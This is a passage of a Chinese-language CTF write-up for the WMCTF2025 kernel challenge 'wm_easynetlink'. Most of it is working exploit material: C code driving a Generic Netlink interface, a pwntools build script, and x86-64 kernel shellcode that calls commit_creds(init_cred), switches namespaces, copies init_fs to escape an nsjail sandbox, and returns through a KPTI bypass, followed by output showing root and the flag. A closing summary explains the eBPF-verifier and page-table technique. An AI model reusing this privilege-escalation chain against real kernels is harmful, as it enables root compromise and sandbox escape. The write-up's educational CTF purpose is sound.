    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win64;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_sp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;
    memcpy(mmap_addr + (do_getuid & 0xfff), shellcode, sizeof(shellcode));
    getuid();
}
int main(int argc, char* argv[]) {
    set_cpu_affinity(0, getpid());
    // init_namespace();
    int err;
    char* buf = calloc(1, 0x4000);
    memset(buf, '\x00', 0x4000);

    nlsock = nl_socket_alloc();
    if (NULL == nlsock) {
        printf("socket error\n");
        return -1;
    }

    err = genl_connect(nlsock);
    if (err != 0) {
        printf("netlink connect error\n");
        nl_socket_free(nlsock);
        return 0;
    }
    famid = genl_ctrl_resolve(nlsock, "easynetlink");
    if (famid <= 0)
        logw("not get family id: %d\n", famid);
    else
        logi("family id: %d\n", famid);
    exp();
}
```

gen.py

```python
from pwn import *
context.arch = "amd64"
shellcode = asm(open("shellcode.S").read())
s = ", ".join(map(lambda c: f"0x{c:02x}", shellcode))
print(s)

buf = open("exp.c").read().replace("####SHELLCODE####", s)
open("exploit.c", "w").write(buf)
```

shellcode.S

```asm
init_cred         = 0x1a50f60
commit_creds      = 0x0c38b0
find_task_by_vpid = 0x0b8ce0
init_nsproxy      = 0x1a50a80
switch_task_namespaces = 0x0c1670
init_fs                = 0x1b6de20
copy_fs_struct         = 0x357c40
kpti_bypass            = 0x10016e1
do_sys_vfork           = 0x08e7a0
_start:
  endbr64
  call a
a:
  pop r15
  sub r15, 0xac019

  lea rdi, [r15 + init_cred]
  lea rax, [r15 + commit_creds]
  call rax

  mov edi, 1
  lea rax, [r15 + find_task_by_vpid]
  call rax

  mov rdi, rax
  lea rsi, [r15 + init_nsproxy]
  lea rax, [r15 + switch_task_namespaces]
  call rax

  lea rdi, [r15 + init_fs]
  lea rax, [r15 + copy_fs_struct]
  call rax
  mov rbx, rax

  mov rdi, 0x1111111111111111
  lea rax, [r15 + find_task_by_vpid]
  call rax

  mov [rax + 1944], rbx

  xor eax, eax
  mov [rsp+0x00], rax
  mov [rsp+0x08], rax
  mov rax, 0x2222222222222222
  mov [rsp+0x10], rax
  mov rax, 0x3333333333333333
  mov [rsp+0x18], rax
  mov rax, 0x4444444444444444
  mov [rsp+0x20], rax
  mov rax, 0x5555555555555555
  mov [rsp+0x28], rax
  mov rax, 0x6666666666666666
  mov [rsp+0x30], rax
  lea rax, [r15 + kpti_bypass]
  jmp rax
  int3
```

第一张运行截图显示初始 shell 仍在 `/tmp` 下，直接 `cat /flag` 会失败：

```text
/tmp $ cat /flag
cat: can't open '/flag': No such file or directory
```

![wm_easynetlink 初始 shell 无法读取 flag](<WMCTF2025-wm-easynetlink-wp/shellcode-s.png>)

第二张运行截图显示 exp 完成页表和 task 相关地址解析后命中提权路径：

```text
[+] ./exploit_easynetlink.c:573 mmap_pud_addr: ...
[+] ./exploit_easynetlink.c:606 phy_addr: 0x120ac000
[+] Win!
WMCTF{EXAMPLE_FLAG}
[+] Done
```

![wm_easynetlink exp 成功输出](<WMCTF2025-wm-easynetlink-wp/shellcode-s-02.png>)

## 方法总结

- 核心技巧：UAF 随机写配合 `bpf_array` 占位，制造 eBPF verifier 与运行时状态不一致，再扩展成任意地址读写；最后解析页表并 patch 内核映射执行 shellcode。
- 识别信号：内核题出现“随机大小 free 块随机偏移写”时，不要只追求精确写；应寻找大小可控、可喷射、能影响 verifier 结论的对象。交互层如果是 Generic Netlink，要先明确 family id、命令号和属性编号。
- 复用要点：`prctl(PR_SET_NAME)` 给 `task_struct.comm` 打标有利于内存搜索；有任意读写后，nsjail 逃逸可通过 `task_struct -> mm_struct -> pgd` 走页表路线。shellcode 除了 `commit_creds(init_cred)`，还需要切 namespace、复制 `fs_struct`，并通过 KPTI bypass 或等价路径返回。
